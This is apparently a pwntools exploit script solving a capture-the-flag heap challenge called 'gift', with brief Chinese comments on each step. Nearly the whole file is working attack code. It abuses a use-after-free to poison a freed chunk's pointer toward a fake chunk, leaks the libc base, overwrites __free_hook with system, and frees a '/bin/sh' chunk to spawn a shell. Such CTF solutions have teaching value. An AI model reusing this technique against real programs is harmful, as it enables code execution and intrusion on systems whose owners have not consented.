from pwn import *
from LibcSearcher import LibcSearcher

context(os='linux',arch='amd64',log_level='debug')
#p = remote('123.56.45.214',14822)
p = process("./gift")
elf = ELF('gift')
libc= elf.libc

menu = b'choice:'
def add(t,content=b'a'*8):
    p.sendlineafter(menu,b'2')
    p.sendlineafter(b'choice:',str(t).encode())
    p.sendafter(b'gift!',content)
def show(idx):
    p.sendlineafter(menu,b'4')
    p.sendlineafter(b'index?',str(idx).encode())
def delete(idx):
    p.sendlineafter(menu,b'3')
    p.sendlineafter(b'index?',str(idx).encode())    
def backdoor(idx,num):
    p.sendlineafter(menu,b'5')
    p.sendlineafter(b'index?',str(idx).encode())  
    p.sendlineafter(b'How much?',str(num).encode())   

[add(1,b'a'*8) for x in range(5)]   #0-4
add(1,p64(0)+p64(0x111))            #5,include fake_chunk
add(1,b'a'*8)                       #6
delete(6)
[delete(x) for x in range(5)]
delete(5)

#UAF edit chunk6_fd->fake_chunk
backdoor(5,-0x130)

#leak libc
#由于前面已经修改过fd，所以再次free chunk0不会触发检查
delete(0)
show(0)
p.recvuntil(b'cost: ')
libc_base = int(p.recvuntil(b'\n')) -0x10 -96 -libc.sym['__malloc_hook']
#libc_base = int(p.recvuntil(b'\n'))-0x3ebca0
free_hook = libc_base+libc.sym['__free_hook']
system = libc_base+libc.sym['system']
print('libc_base',hex(libc_base))
#pause()

#gdb.attach(p,'b malloc\nb free\nb realloc\nb calloc\nc')
#sleep(1)
#申请回chunk5,修改其中fake_chunk_fd
add(1,p64(0)+p64(0x111)+p64(free_hook-0x10)+p64(0)+b'z'*8)   #chunk5,idx=7
#从fake_chunk开始填充，修改chunk6_content
add(1,b'a'*0xd0+p64(0)+p64(0x111)+b'/bin/sh\x00')            #fake_chunk,idx=8
add(1,p64(system))                                           #free_hook,idx=9
delete(6)

p.interactive()
p.close()


